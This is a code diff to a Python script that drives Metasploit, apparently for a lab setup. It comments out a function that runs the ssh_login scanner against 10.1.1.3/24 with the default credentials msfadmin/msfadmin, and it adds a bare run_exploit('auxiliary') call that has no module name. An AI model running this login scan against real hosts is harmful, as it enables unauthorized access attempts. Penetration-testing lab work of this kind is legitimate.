@@ -17,43 +17,45 @@ e.register(name="msf", framework=msfInstance)
 # LEAVE THIS OPTION
 #version1:
 #msfInstance.run_exploit('auxiliary', 'scanner/ssh/ssh_login')
+msfInstance.run_exploit('auxiliary')
+
 
 #version2:
 # Extracted Exploit Logic
-def run_msf_exploit():
-    # Set up exploit details
-    mtype = 'auxiliary'
-    mname = 'scanner/ssh/ssh_login'
-    rhosts = '10.1.1.3/24'
-    username = 'msfadmin'
-    password = 'msfadmin'
-    threads = 5
+# def run_msf_exploit():
+#     # Set up exploit details
+#     mtype = 'auxiliary'
+#     mname = 'scanner/ssh/ssh_login'
+#     rhosts = '10.1.1.3/24'
+#     username = 'msfadmin'
+#     password = 'msfadmin'
+#     threads = 5
 
-    # Use the exploit from Metasploit
-    exploit = msfInstance.client.modules.use(mtype, mname)
-    exploit["RHOSTS"] = rhosts
-    exploit["USERNAME"] = username
-    exploit["PASSWORD"] = password
-    exploit["THREADS"] = threads
+#     # Use the exploit from Metasploit
+#     exploit = msfInstance.client.modules.use(mtype, mname)
+#     exploit["RHOSTS"] = rhosts
+#     exploit["USERNAME"] = username
+#     exploit["PASSWORD"] = password
+#     exploit["THREADS"] = threads
 
-    # Execute the exploit
-    print(f"Running exploit: {mname} on {rhosts} with 1 second scan...")
-    result = exploit.execute()
-    print("Exploit Result:", result)
-    time.sleep(1)
+#     # Execute the exploit
+#     print(f"Running exploit: {mname} on {rhosts} with 1 second scan...")
+#     result = exploit.execute()
+#     print("Exploit Result:", result)
+#     time.sleep(1)
 
-    # Wait for scan completion
-    if 'job_id' in result:
-        print("[+] Exploit scan started successfully.")
-        time.sleep(1)
-    else:
-        print("[!] Scan failed.")
+#     # Wait for scan completion
+#     if 'job_id' in result:
+#         print("[+] Exploit scan started successfully.")
+#         time.sleep(1)
+#     else:
+#         print("[!] Scan failed.")
         
-    print("Returning Exploit Result:", result)
-    return result
+#     print("Returning Exploit Result:", result)
+#     return result
 
-exploit_result = run_msf_exploit()
-print(f"[++++] RESULT = {exploit_result}")
+# exploit_result = run_msf_exploit()
+# print(f"[++++] RESULT = {exploit_result}")
 
 # Retrieve and print hosts
 hostSet = e.get_hosts()  # Retrieve all connected hosts across frameworks
